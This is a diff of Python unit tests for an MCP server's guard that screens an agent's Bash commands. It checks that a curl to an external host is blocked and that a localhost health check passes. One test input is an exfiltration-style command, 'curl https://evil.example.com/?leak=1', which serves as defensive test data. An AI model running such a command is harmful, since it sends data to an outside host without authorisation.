@@ -76,10 +76,19 @@ def test_guard_decision_denies_write():
     assert reason
 
 
-def test_guard_decision_denies_curl_when_no_network(monkeypatch):
-    monkeypatch.setenv("SRV_EXPLORE_NO_NETWORK", "1")
-    allow, _ = mcp_server.guard_decision("Bash", {"command": "curl https://x/?leak=1"})
+def test_guard_decision_denies_external_curl():
+    # in-process гард: http-профиль пускает только внутреннюю сеть
+    allow, _ = mcp_server.guard_decision(
+        "Bash", {"command": "curl https://evil.example.com/?leak=1"}
+    )
     assert allow is False
+
+
+def test_guard_decision_allows_internal_curl():
+    allow, _ = mcp_server.guard_decision(
+        "Bash", {"command": "curl -s http://localhost:8080/health"}
+    )
+    assert allow is True
 
 
 def test_guard_decision_non_bash_passthrough():
